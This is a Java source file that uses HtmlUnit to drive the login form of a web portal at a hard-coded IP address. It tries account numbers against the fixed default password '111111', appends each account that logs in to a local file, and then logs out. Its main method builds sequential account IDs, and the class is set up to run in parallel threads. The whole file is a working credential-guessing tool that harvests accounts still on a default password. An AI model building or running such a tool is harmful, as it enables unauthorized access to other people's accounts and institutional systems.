package site.wetsion.drpub.mainservice;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.net.MalformedURLException;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlElement;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlPasswordInput;
import com.gargoylesoftware.htmlunit.html.HtmlTextInput;

import site.wetsion.drpub.inferface.AbsractService;

public class MainService extends AbsractService implements Runnable{
	
	private final static Logger log = LoggerFactory.getLogger(MainService.class);
	
	private static final String URL = "http://202.113.95.244/";

	private String accunt;
	
	public void setAccunt(String accunt) {
		this.accunt = accunt;
	}

	public  void login(String account){
		WebClient client = initWebClient();
		System.out.println("测试账号"+account);
		try {
			HtmlPage page = client.getPage(URL);
			
			final HtmlForm form = page.getFormByName("f1");
			
			HtmlTextInput input_username = form.getInputByName("DDDDD");
			input_username.setText(account);
			HtmlPasswordInput input_pwd = form.getInputByName("upass");
			input_pwd.setText("111111");
			
			HtmlElement loginbtn = (HtmlElement) page.getElementById("login");
			
			page = loginbtn.click();
			
			String pageText = page.asText();
			
			File file = new File("E:\\avliaccount.txt");
			if (pageText.contains("PC注销页")) {
				System.out.println("登录成功:账号："+account);
//				FileOutputStream fileOutputStream = new FileOutputStream(file);
				StringBuilder builder = new StringBuilder(account);
				builder.append("\n");
//				fileOutputStream.write(builder.toString().getBytes());
//				fileOutputStream.close();
				FileWriter fileWriter = new FileWriter(file, true);
				fileWriter.write(builder.toString());
				fileWriter.close();
				HtmlElement logoutbtn = (HtmlElement) page.getElementById("LogoutButton");
				page = logoutbtn.click();
				HtmlElement ui_p = (HtmlElement) page.getByXPath("//p[@class='ui_p']").get(0);
				HtmlElement sure = (HtmlElement) ui_p.getFirstElementChild();
				sure.click();
//				System.out.println(sure.asXml());
			} else {
				System.out.println("登录失败:"+account);
			}
			client.closeAllWindows();
		} catch (FailingHttpStatusCodeException e) {
			log.error(e.getMessage());
		} catch (MalformedURLException e) {
			log.error(e.getMessage());
		} catch (IOException e) {
			log.error(e.getMessage());
		} catch (ClassCastException e) {
			log.error(e.getMessage());
		}
	}
	
	public static void main(String[] args) {
		StringBuilder builder = new StringBuilder();
		int num = 1990003;
		builder.append(num);
//		MainService.login(builder.toString());
	}

	public void run() {
		login(accunt);
	}
	
}
